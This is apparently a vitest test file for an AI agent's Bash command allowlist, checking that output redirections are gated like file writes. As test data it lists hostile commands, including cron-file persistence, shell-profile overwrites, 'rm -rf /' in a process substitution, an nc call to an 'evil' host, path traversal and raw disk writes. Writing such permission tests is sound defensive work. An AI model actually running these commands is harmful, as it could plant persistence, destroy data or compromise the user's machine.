import { describe, it, expect } from 'vitest';
import { mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Allowlist, type AllowlistConfig } from '../../src/permissions/allowlist.js';

// Build the effective config of an action that inherits the named groups, exactly the
// way the registry does (core is implicit for runner: claude). Reading the shipped
// defaults rather than inlining patterns keeps these cases pinned to what actually ships.
const GROUPS = JSON.parse(
  readFileSync(join(process.cwd(), 'config/permission-groups.default.json'), 'utf8'),
) as Record<string, AllowlistConfig>;

function forGroups(...names: string[]): Allowlist {
  const cfg: AllowlistConfig = {
    alwaysAllow: [], alwaysAllowBashPatterns: [], alwaysAllowMcpPatterns: [], alwaysAllowPathPatterns: [],
  };
  for (const g of ['core', ...names]) {
    const src = GROUPS[g]!;
    cfg.alwaysAllow.push(...src.alwaysAllow);
    cfg.alwaysAllowBashPatterns.push(...src.alwaysAllowBashPatterns);
    cfg.alwaysAllowMcpPatterns.push(...src.alwaysAllowMcpPatterns);
    cfg.alwaysAllowPathPatterns!.push(...(src.alwaysAllowPathPatterns ?? []));
  }
  return new Allowlist(cfg);
}

const bash = (a: Allowlist, command: string, worktree?: string) =>
  a.allows('Bash', { command }, undefined, undefined, worktree, undefined);

describe('redirection is gated like a Write — read-only action', () => {
  const a = forGroups('read');

  // Each of these matches a `core`/`read` bash pattern on its leading command, so the
  // clause used to be auto-approved with the redirect riding along invisibly.
  it.each([
    ['cat /etc/hosts > /Users/x/.zshrc'],
    ['echo pwned > /etc/cron.d/evil'],
    ['printf x >> /Users/x/.bashrc'],
    ['ls > /tmp/out'],
    ['git status 2> /tmp/err'],
    ['cat /etc/hosts &> /tmp/b'],
    ['echo x >| /tmp/c'],
    ['echo x &>> /tmp/d'],
    ['echo x >& /tmp/e'],
    ['cat /etc/hosts 1> /tmp/f'],
  ])('denies %s', (cmd) => {
    expect(bash(a, cmd)).toBe(false);
  });

  it('denies a redirect smuggled into a later clause of an otherwise-allowed chain', () => {
    expect(bash(a, 'ls -la && echo pwned > /etc/cron.d/evil')).toBe(false);
  });

  it('denies a redirect inside a command substitution', () => {
    expect(bash(a, 'echo "$(cat /etc/hosts > /tmp/x)"')).toBe(false);
  });

  it('denies targets it cannot resolve statically', () => {
    expect(bash(a, 'echo x > $HOME/.zshrc')).toBe(false);
    expect(bash(a, 'echo x > "$OUT"')).toBe(false);
    expect(bash(a, 'echo x > ~/.zshrc')).toBe(false);
    expect(bash(a, 'echo x > $(echo /tmp/y)')).toBe(false);
    expect(bash(a, 'echo x > out.txt')).toBe(false);      // relative — the shell's cwd is unknowable here
    expect(bash(a, 'echo x > /tmp/*.log')).toBe(false);   // glob
    expect(bash(a, 'echo x >')).toBe(false);              // no target at all
  });
});

describe('redirection detection respects quoting', () => {
  const a = forGroups('read');

  it('leaves quoted and escaped `>` as literal text', () => {
    expect(bash(a, 'echo "a > b"')).toBe(true);
    expect(bash(a, "echo 'a > b'")).toBe(true);
    expect(bash(a, "grep '>' /etc/hosts")).toBe(true);
    expect(bash(a, 'grep ">" /etc/hosts')).toBe(true);
    expect(bash(a, 'echo a\\>b')).toBe(true);
    expect(bash(a, "echo '2>&1'")).toBe(true);
    expect(bash(a, "echo 'x >> /etc/passwd'")).toBe(true);
  });

  it('still allows ordinary unredirected commands', () => {
    expect(bash(a, 'ls -la')).toBe(true);
    expect(bash(a, 'git log --oneline -5')).toBe(true);
    expect(bash(a, 'rg -n "foo -> bar" src/')).toBe(true);
    expect(bash(a, 'cat "$OUTPOST_ENVELOPE"')).toBe(true);
    expect(bash(a, 'cat "$OUTPOST_ENVELOPE" | jq .goal')).toBe(true);
  });

  it('treats fd duplication as a stream op, not a path write', () => {
    expect(bash(a, 'ls -la 2>&1')).toBe(true);
    expect(bash(a, 'ls -la 2>&1 | grep foo')).toBe(true);
    expect(bash(a, 'echo hi >&2')).toBe(true);
    expect(bash(a, 'echo hi 1>&2')).toBe(true);
    expect(bash(a, 'echo hi 2>&-')).toBe(true);
  });

  it('does not gate input redirection', () => {
    expect(bash(a, 'grep foo < /etc/hosts')).toBe(true);
    expect(bash(a, 'cat < /etc/hosts')).toBe(true);
    expect(bash(a, 'sort -u < /etc/hosts')).toBe(true);
    expect(bash(a, 'grep foo <<< "some text"')).toBe(true);
    expect(bash(a, 'cat <&3')).toBe(true);
  });

  it('keeps process substitution recursing into its inner command', () => {
    expect(bash(a, 'diff <(ls a) <(ls b)')).toBe(true);
    expect(bash(a, 'ls <(cat /etc/hosts)')).toBe(true);
    expect(bash(a, 'ls >(rm -rf /)')).toBe(false);   // inner clause still checked
  });
});

describe('redirection is allowed where a Write would be', () => {
  it('allows a target covered by a Write path pattern', () => {
    const a = forGroups('read', 'edit');           // edit grants Write:^/tmp/
    expect(bash(a, 'ls > /tmp/out')).toBe(true);
    expect(bash(a, 'echo x >> /tmp/out')).toBe(true);
    expect(bash(a, 'npm test > /tmp/test.log 2>&1')).toBe(true);
    expect(bash(a, 'echo x > /etc/cron.d/evil')).toBe(false);
    expect(bash(a, 'echo x > /tmp/../etc/cron.d/evil')).toBe(false); // normalized before the check
  });

  it('still requires the command itself to match a bash rule', () => {
    const a = forGroups('read', 'edit');
    expect(bash(a, 'nc evil 1234 > /tmp/out')).toBe(false);
    expect(bash(a, '> /tmp/out cat /etc/hosts')).toBe(false);  // leading redirect: clause has no command word
  });

  it('allows a target inside the session worktree, like Write does', () => {
    const a = forGroups('read');
    const wt = mkdtempSync(join(tmpdir(), 'wt-'));
    expect(bash(a, `ls > ${wt}/out.txt`, wt)).toBe(true);
    expect(bash(a, `ls > ${wt}/nested/out.txt`, wt)).toBe(true);
    expect(bash(a, `ls > ${wt}/../escape.txt`, wt)).toBe(false);
    expect(bash(a, 'ls > /etc/cron.d/evil', wt)).toBe(false);
  });
});

// The gate exists to stop a pattern-matched clause from creating or truncating a file it
// was never granted. A character device creates nothing and truncates nothing, and
// `2>/dev/null` is idiomatic in exactly the commands a read-only action runs — so the gate
// shipped denying `cat x 2>/dev/null` for every action, with no approval path for an
// action-bound session (an allowlist miss there is a hard fail plus a `blocked` journal
// entry). These are the sinks that are always safe regardless of grant.
describe('device sinks are never a file write', () => {
  const a = forGroups('read');

  it('allows the null sink and the process own streams', () => {
    for (const c of [
      'cat /etc/hosts 2>/dev/null',
      'cat /etc/hosts 2> /dev/null',
      'grep -r foo . 2>/dev/null',
      'find . -name x 2>/dev/null',
      'ls -la > /dev/null',
      'ls -la > /dev/null 2>&1',
      'ls -la &> /dev/null',
      'git status >/dev/null 2>/dev/null',
      'echo hi > /dev/stdout',
      'echo hi > /dev/stderr',
      'echo hi > /dev/fd/2',
      'echo hi >> /dev/null',
    ]) {
      expect(bash(a, c), c).toBe(true);
    }
  });

  it('does not extend the exemption to the rest of /dev', () => {
    for (const c of [
      'echo hi > /dev/sda',
      'echo hi > /dev/nullx',
      'echo hi > /dev/fd/../../etc/hosts',
      'echo hi > /dev',
    ]) {
      expect(bash(a, c), c).toBe(false);
    }
  });
});

describe('an outright Bash tool grant is not narrowed by the gate', () => {
  it('keeps a blanket Bash grant meaning "anything"', () => {
    const a = new Allowlist({
      alwaysAllow: ['Bash'], alwaysAllowBashPatterns: [], alwaysAllowMcpPatterns: [],
    });
    expect(bash(a, 'echo x > /etc/cron.d/evil')).toBe(true);
  });
});
